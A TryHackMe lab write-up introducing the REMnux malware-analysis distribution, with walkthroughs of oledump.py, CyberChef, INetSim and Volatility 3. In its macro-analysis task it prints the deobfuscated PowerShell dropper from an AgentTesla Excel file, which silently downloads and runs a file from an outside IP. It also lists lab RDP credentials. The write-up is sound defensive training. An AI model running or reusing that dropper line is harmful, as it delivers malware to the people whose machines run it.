# 🐧 TryHackMe - REMnux: Getting Started

> REMnux is a specialized Linux distribution built for malware analysis, reverse engineering, and memory forensics.  
> This room introduces REMnux tools through hands-on static and dynamic malware analysis scenarios.

---

## 🧠 Task 1 - Introduction

![REMnux Secure Analysis Environment](https://github.com/user-attachments/assets/67497700-abc9-4b65-b2b0-e5685e415cf2)

During security incidents, time is limited, and accuracy is critical. Analysts require dedicated tools and environments to investigate malware safely.

### 🔐 Why REMnux?

- Preloaded tools for malware and document analysis
- Sandboxed, safe-to-execute environment
- Built and maintained by [REMnux.org](https://remnux.org/)
- Perfect for reversing malicious payloads, inspecting memory images, and simulating networks

### 🧰 Built-In Tools

- **Volatility 3**: Memory forensics
- **oledump.py**: OLE document parsing
- **INetSim**: Fake internet simulation
- **CyberChef**: Decoding and data transformation
- **YARA, Wireshark, pecheck, exiftool**, and more

---

## 🚀 Task 2 - Machine Access

![REMnux Desktop and Task Directory](https://github.com/user-attachments/assets/02a6216e-aba4-479e-84e8-123b650d8cb0)

- Click **Start Machine** to launch the REMnux VM
- Files for all exercises are located in:

```bash
~/Desktop/tasks/
```

- To interact with the VM directly, use RDP:
  - **Username**: Administrator
  - **Password**: letmein123!
  - **IP Address**: MACHINE_IP

---

## 📄 Task 3 - File Analysis with oledump.py

![CyberChef Deobfuscation Output](https://github.com/user-attachments/assets/831e819b-1456-4e60-b420-29dbb500e354)

### 🧪 Analyzing a Malicious Excel Document

Navigate to:

```bash
cd ~/Desktop/tasks/agenttesla/
oledump.py agenttesla.xlsm
```

Output shows streams (`A`, `A1`, ..., `A6`), where:
- `M` = macro present
- `A4` = `VBA/ThisWorkbook` contains embedded VBA

### 📤 Dumping the Macro

```bash
oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

🔎 Extracts and decompresses obfuscated VBA code.

Key variable:

```vb
Sqtnew = "^p*o^*w*e*r..."
```

### 🧰 CyberChef - Deobfuscation

Steps:
1. Copy Sqtnew string
2. Paste into CyberChef (online or in-VM version)
3. Add:
   - Find/Replace `*` → `""`
   - Find/Replace `^` → `""`

📜 Final output:

```powershell
powershell -WindowStyle hidden -executionpolicy bypass
Invoke-WebRequest -Uri "http://193.203.203.67/..." -OutFile $TempFile
Start-Process $TempFile
```

💡 This confirms the Excel file is a **dropper**, downloading and executing malware silently.

---

## 🌐 Task 4 - Fake Network with INetSim


![REMnux + AttackBox Tabs](https://github.com/user-attachments/assets/bda53a10-81b7-49d4-a80f-49d87cdae4ff)

![Accept Risk Page - INetSim Access](https://github.com/user-attachments/assets/5c307055-bebc-4f03-ade8-20e165836e85)

![INetSim HTML Homepage](https://github.com/user-attachments/assets/b785b374-5631-4b5e-8f26-9a40bda9ba3a)

![Fake Payload Files Downloaded](https://github.com/user-attachments/assets/c1cb97be-b474-4eb7-8ee0-f343e4035901)


### 🧱 Step 1: Configure INetSim

Check IP:

```bash
ip a
```

Edit config:

```bash
sudo nano /etc/inetsim/inetsim.conf
```

Uncomment and set:

```text
dns_default_ip MACHINE_IP
```

Verify:

```bash
grep dns_default_ip /etc/inetsim/inetsim.conf
```

### ▶️ Step 2: Start INetSim

```bash
sudo inetsim
```

Expected output:

```
Simulation running.
```

Ignore: `http_80_tcp - failed!`

---

### 🌍 Step 3: Simulate C2 with AttackBox

From the AttackBox, run:

```bash
wget https://MACHINE_IP/second_payload.zip --no-check-certificate
wget https://MACHINE_IP/second_payload.ps1 --no-check-certificate
```

Files mimic malware trying to download secondary payloads.

---

### 📊 Step 4: Analyze Logs

Check logs after stopping INetSim:

```bash
sudo cat /var/log/inetsim/report/report.<ID>.txt
```

Sample log entry:

```
HTTPS connection, method: GET, URL: https://MACHINE_IP/second_payload.ps1
```

---

## 🧠 Task 5 - Memory Preprocessing with Volatility


![Volatility Output Files - Plugin Results](https://github.com/user-attachments/assets/b122cb19-010c-4fe5-8eed-db938b5c3ad3)

![Volatility Output Files - Strings Extracted](https://github.com/user-attachments/assets/e31c4658-6e7b-4120-bf67-d45da5106619)


### 🧠 Step 1: Basic Memory Plugins

Navigate to:

```bash
cd ~/Desktop/tasks/Wcry_memory_image/
sudo su
```

Run:

```bash
vol3 -f wcry.mem windows.pstree.PsTree
vol3 -f wcry.mem windows.pslist.PsList
vol3 -f wcry.mem windows.cmdline.CmdLine
vol3 -f wcry.mem windows.filescan.FileScan
vol3 -f wcry.mem windows.dlllist.DllList
vol3 -f wcry.mem windows.psscan.PsScan
vol3 -f wcry.mem windows.malfind.Malfind
```

---

### ⚙️ Step 2: Batch Processing with Loop

```bash
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
```

- Output files saved as:
  - `wcry.windows.pstree.PsTree.txt`
  - `wcry.windows.malfind.Malfind.txt`

---

### 🧵 Step 3: Strings Preprocessing

Extract useful strings:

```bash
strings wcry.mem > wcry.strings.ascii.txt
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
```

💡 These are vital for:
- Finding URLs
- Malware signatures
- Command-line history

---

## ✅ Task 6 - Conclusion

### 🧰 What You’ve Learned

- How to inspect macros in Office documents with **oledump.py**
- How to simulate fake internet services with **INetSim**
- How to preprocess memory images using **Volatility 3**
- How to extract valuable strings using native Linux tools

### 🧠 Why REMnux?

REMnux bundles dozens of powerful tools for:

- Reverse engineering
- Static & dynamic analysis
- Memory forensics
- Network emulation
- Malware triage

It allows analysts to focus on **analysis**, not setup.

---

## 📚 Resources

- [REMnux.org](https://remnux.org/)
- [Volatility Docs](https://volatility3.readthedocs.io/)
- [INetSim Docs](https://www.inetsim.org/)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [oledump.py](https://blog.didierstevens.com/programs/oledump-py/)
